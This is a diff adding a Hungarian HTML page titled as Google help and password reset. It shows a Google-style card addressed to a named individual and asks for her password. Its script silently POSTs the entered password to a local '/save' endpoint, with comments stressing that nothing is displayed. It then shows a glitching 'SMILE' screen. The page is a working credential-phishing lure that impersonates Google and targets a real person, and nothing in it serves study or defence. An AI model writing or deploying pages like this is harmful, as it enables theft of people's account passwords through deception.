@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="hu">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Google/Help.Újraállítás</title>
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Arial', sans-serif;
+}
+
+body {
+    background: #f2f2f2;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 20px;
+}
+
+.card {
+    width: 800px; /* Szélesbítettem */
+    max-width: 100%;
+    background: white;
+    color: black;
+    border-radius: 8px;
+    padding: 48px 40px 36px;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12);
+}
+
+.logo-container {
+    text-align: center;
+    margin-bottom: 16px;
+}
+
+.logo {
+    width: 75px;
+    height: auto;
+}
+
+h1 {
+    font-size: 24px;
+    font-weight: 400;
+    margin-bottom: 8px;
+    text-align: center;
+}
+
+.subtitle {
+    font-size: 16px;
+    line-height: 1.5;
+    text-align: center;
+    margin-bottom: 32px;
+}
+
+input[type="password"],
+input[type="text"] {
+    width: 100%;
+    padding: 17px 15px;
+    border: 1px solid #dadce0;
+    border-radius: 4px;
+    color: black;
+    font-size: 16px;
+    outline: none;
+}
+
+input[type="password"]:focus,
+input[type="text"]:focus {
+    border-color: #1a73e8;
+    border-width: 2px;
+    padding: 16px 14px; /* compensate for border width change */
+}
+
+.options {
+    margin-top: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}
+
+.options input[type="checkbox"] {
+    width: auto;
+}
+
+label {
+    cursor: pointer;
+    font-size: 14px;
+}
+
+button {
+    margin-top: 32px;
+    float: right;
+    padding: 12px 24px;
+    border: none;
+    border-radius: 4px;
+    background: #1a73e8;
+    color: white;
+    font-weight: bold;
+    font-size: 14px;
+    cursor: pointer;
+}
+
+button:hover {
+    background: #1765cc;
+}
+
+@media (max-width: 768px) {
+    .card {
+        padding: 32px 24px;
+    }
+
+    h1 {
+        font-size: 20px;
+    }
+}
+
+/* Új stílusok a sikeres beküldés utáni nézethez */
+.success-container {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    background: #000;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 1000;
+}
+
+.smiley-face {
+    width: 100px;
+    height: 100px;
+    border-radius: 50%;
+    background: #fff;
+    position: relative;
+    margin-bottom: 20px;
+    animation: glitch 1s infinite; /* Glitch animáció */
+}
+
+@keyframes glitch {
+    0% { transform: translate(0); }
+    20% { transform: translate(-2px, 2px); }
+    40% { transform: translate(-2px, -2px); }
+    60% { transform: translate(2px, 2px); }
+    80% { transform: translate(2px, -2px); }
+    100% { transform: translate(0); }
+}
+
+.smiley-face::before,
+.smiley-face::after {
+    content: '';
+    position: absolute;
+    width: 10px;
+    height: 10px;
+    background: #000;
+    border-radius: 50%;
+    top: 35px;
+}
+
+.smiley-face::before {
+    left: 25px;
+}
+
+.smiley-face::after {
+    right: 25px;
+}
+
+.smile {
+    position: absolute;
+    bottom: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 40px;
+    height: 20px;
+    border-bottom: 3px solid #000;
+    border-radius: 0 0 20px 20px;
+}
+
+.success-text {
+    color: #fff;
+    font-size: 24px;
+    font-weight: bold;
+    text-transform: uppercase;
+    letter-spacing: 2px;
+    margin-bottom: 10px;
+}
+
+.quote {
+    color: #ccc;
+    font-size: 14px;
+    text-align: center;
+    max-width: 300px;
+    line-height: 1.4;
+    text-shadow: 0 0 5px #fff, 0 0 10px #fff, 0 0 15px #fff; /* Világító hatás */
+}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="logo-container">
+    <!-- Saját logó -->
+    <img src="C:\Users\kovac\Downloads\igy fog jol kinezni.png" alt="Logo" class="logo">
+  </div>
+  
+  <h1>Béresné Madai Krisztina</h1>
+  
+  <p class="subtitle">Adja meg a jelszót a folytatáshoz</p>
+  
+  <input type="password" id="pwd" placeholder="Jelszó">
+
+  <!-- Hozzáadtam egy elemet az állapot jelzésére -->
+  <div id="status" style="margin-top:10px; font-size:14px; color:#ccc;"></div>
+
+  <div class="options">
+    <input type="checkbox" id="show">
+    <label for="show">Jelszó megjelenítése</label>
+  </div>
+
+  <!-- Gombnak adtam id-t a könnyebb elérhetőség érdekében -->
+  <button type="button" id="loginBtn" onclick="login()">Tovább</button>
+</div>
+
+<!-- Sikeres beküldés utáni nézet -->
+<div class="success-container" id="successContainer">
+  <div class="smiley-face">
+    <div class="smile"></div>
+  </div>
+  <div class="success-text">SMILE</div>
+  <div class="quote">Nem látni egy fától az erdőt mily szomorú, de amint felvillan a figyelem elillan</div>
+</div>
+
+<script>
+// JAVÍTÁS: document.getElementById("pwd")
+const passwordInput = document.getElementById("pwd");
+const showCheckbox = document.getElementById("show");
+const statusDiv = document.getElementById("status");
+const loginBtn = document.getElementById("loginBtn");
+const successContainer = document.getElementById("successContainer");
+
+showCheckbox.addEventListener("change", () => {
+  passwordInput.type = showCheckbox.checked ? "text" : "password";
+});
+
+function login() {
+  // JAVÍTÁS: ID: "show" (nem "checkbox")
+  const checkbox = document.getElementById("show");
+
+  // JAVÍTÁS: Az input értékének lekérése a passwordInput-ból
+  const input = passwordInput;
+  const gomb = loginBtn;
+
+  if (!input.value.trim()) {
+    statusDiv.textContent = "Kérlek adj meg egy jelszót.";
+    return;
+  }
+
+  async function kuldes() {
+    try {
+      // Figyelem: Ha localhost:3000-re küldesz, a szervernek engedélyeznie kell a CORS-t!
+      await fetch('http://localhost:3000/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ uzenet: input.value })
+      });
+      // NEM írunk ki semmit, csak küldjük el
+      
+      // Sikeres beküldés után megjelenítjük a successContainer-t
+      successContainer.style.display = 'flex';
+    } catch (error) {
+      console.error("Hiba:", error);
+      // NEM írunk ki semmit, ha hiba történik
+    } finally {
+      // Reseteljük a bemenetet
+      input.value = '';
+    }
+  }
+
+  kuldes();
+}
+
+// Enter billentyű támogatása
+document.addEventListener('keydown', function(event) {
+  if (event.key === 'Enter') {
+    login();
+  }
+});
+</script>
+
+</body>
+</html>
